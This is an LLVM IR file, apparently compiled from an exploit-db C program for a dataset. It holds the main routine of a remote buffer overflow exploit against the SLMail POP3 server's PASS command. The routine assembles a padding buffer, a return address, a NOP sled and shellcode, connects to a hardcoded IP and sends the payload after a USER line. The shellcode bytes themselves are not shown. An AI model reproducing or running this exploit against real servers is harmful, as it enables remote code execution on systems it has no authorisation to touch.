; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_643.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_643.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@retadd = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [81 x i8] c"[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\0A\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"192.168.224.144\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"[*] %s\00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"USER username\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"PASS \00", align 1
@.str.5 = private unnamed_addr constant [25 x i8] c"Shellcode len: %d bytes\0A\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"Buffer len: %d bytes\0A\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca [1024 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %10 = call i8* @malloc(i32 2960)
  store i8* %10, i8** %7, align 8
  %11 = load i8*, i8** %7, align 8
  %12 = call i32 @memset(i8* %11, i32 0, i32 2960)
  %13 = call i8* @malloc(i32 2606)
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %8, align 8
  %15 = call i32 @memset(i8* %14, i32 0, i32 2606)
  %16 = load i8*, i8** %8, align 8
  %17 = call i32 @memset(i8* %16, i32 65, i32 2605)
  %18 = call i8* @malloc(i32 13)
  store i8* %18, i8** %9, align 8
  %19 = load i8*, i8** %9, align 8
  %20 = call i32 @memset(i8* %19, i32 0, i32 13)
  %21 = load i8*, i8** %9, align 8
  %22 = call i32 @memset(i8* %21, i32 144, i32 12)
  %23 = load i8*, i8** %7, align 8
  %24 = load i8*, i8** %8, align 8
  %25 = call i32 @strcat(i8* %23, i8* %24)
  %26 = load i8*, i8** %7, align 8
  %27 = load i8*, i8** @retadd, align 8
  %28 = call i32 @strcat(i8* %26, i8* %27)
  %29 = load i8*, i8** %7, align 8
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 @strcat(i8* %29, i8* %30)
  %32 = load i8*, i8** %7, align 8
  %33 = load i8*, i8** @shellcode, align 8
  %34 = call i32 @strcat(i8* %32, i8* %33)
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %36 = call i32 @conn(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  store i32 %36, i32* %5, align 4
  %37 = load i32, i32* %5, align 4
  %38 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %39 = call i32 @read(i32 %37, i8* %38, i32 1024)
  %40 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0), i8* %40)
  %42 = load i32, i32* %5, align 4
  %43 = call i32 @write(i32 %42, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 15)
  %44 = load i32, i32* %5, align 4
  %45 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %46 = call i32 @read(i32 %44, i8* %45, i32 1024)
  %47 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0), i8* %47)
  %49 = load i32, i32* %5, align 4
  %50 = call i32 @write(i32 %49, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0), i32 5)
  %51 = load i32, i32* %5, align 4
  %52 = load i8*, i8** %7, align 8
  %53 = load i8*, i8** %7, align 8
  %54 = call i32 @strlen(i8* %53)
  %55 = call i32 @write(i32 %51, i8* %52, i32 %54)
  %56 = load i8*, i8** @shellcode, align 8
  %57 = call i32 @strlen(i8* %56)
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i32 %57)
  %59 = load i8*, i8** %7, align 8
  %60 = call i32 @strlen(i8* %59)
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0), i32 %60)
  %62 = load i32, i32* %5, align 4
  %63 = call i32 @write(i32 %62, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i32 4)
  %64 = load i32, i32* %5, align 4
  %65 = call i32 @close(i32 %64)
  ret i32 0
}

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @conn(i8*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
